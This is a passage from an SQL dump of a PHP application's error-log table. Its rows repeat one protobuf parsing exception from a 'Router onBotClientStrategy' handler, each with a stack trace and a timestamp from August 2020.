(75, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:01:15'),
(76, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:01:15');
INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(77, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:01:16'),
(78, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:08'),
(79, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:09'),
(80, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:10'),
(81, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'D\\xAAy\\xB3>3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'D\\xAAy\\xB3>3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'D\\xAAy\\xB3>3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:41'),
(82, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:43'),
(83, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:52'),
(84, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:02:55'),
(85, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:03:02'),
(86, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:03:03'),
(87, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:03:04'),
(88, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:03:40'),
(89, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:59:45'),
(90, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 09:48:15'),
(91, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-11 00:51:22'),
(92, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-11 07:03:00'),
(93, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-11 07:12:16'),
(94, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-11 09:08:57'),
(95, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-11 22:13:26'),
(96, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 02:44:25'),
(97, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 05:21:37'),
(98, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 06:12:32'),
(99, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:32:59'),
(100, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:00'),
(101, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:01'),
(102, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:02'),
(103, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:03'),
